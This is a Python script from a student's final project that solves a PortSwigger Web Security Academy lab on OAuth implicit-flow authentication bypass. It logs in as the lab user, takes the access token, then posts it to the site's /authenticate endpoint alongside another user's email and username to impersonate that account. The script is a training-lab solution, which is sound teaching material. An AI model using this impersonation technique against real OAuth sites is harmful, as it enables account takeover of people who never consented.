# By Andrew Stevenson for CS595 at PSU Spring '21 Final Project
# Solves lab: https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

s = requests.Session()

# Get the login redirects page from host site
site = 'ac1b1fd81e0979b280ba174c00ac00a3.web-security-academy.net'
auth_redirect_url = f'https://{site}/social-login'
resp = s.get(auth_redirect_url)

# Get & load the auth url with args (nonce, clientid, etc.)
soup = BeautifulSoup(resp.text, 'html.parser')
auth_url = soup.meta['content'][6:]
resp = s.get(auth_url)

# Get the form submit url & send provided credentials via POST
soup = BeautifulSoup(resp.text, 'html.parser')
submit_folder = soup.form['action']
auth_site = urlparse(resp.request.url).hostname
submit_url = f'https://{auth_site}{submit_folder}'
form_data = {
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(submit_url, data=form_data)

# Confirm the login
soup = BeautifulSoup(resp.text, 'html.parser')
confirm_folder = soup.form['action']
confirm_url = f'https://{auth_site}{confirm_folder}'
resp = s.post(confirm_url)

# Use the token to 'verify' the email
token = parse_qs(urlparse(resp.url)[5])['access_token'][0]
token_url = f'https://{auth_site}/me'
headers = {
    'Authorization': f'Bearer {token}'
}
resp = s.get(token_url, headers=headers)
print(f'Verification reply: \n{resp.text}\n')

# Lie to the host site, presenting my legitimate token
authenticate_url = f'https://{site}/authenticate'
payload = {
    'email': 'carlos@carlos-montoya.net',
    'username': 'carlos',
    'token': token
}
resp = s.post(authenticate_url, json=payload)

soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.find(text='Congratulations, you solved the lab!'))
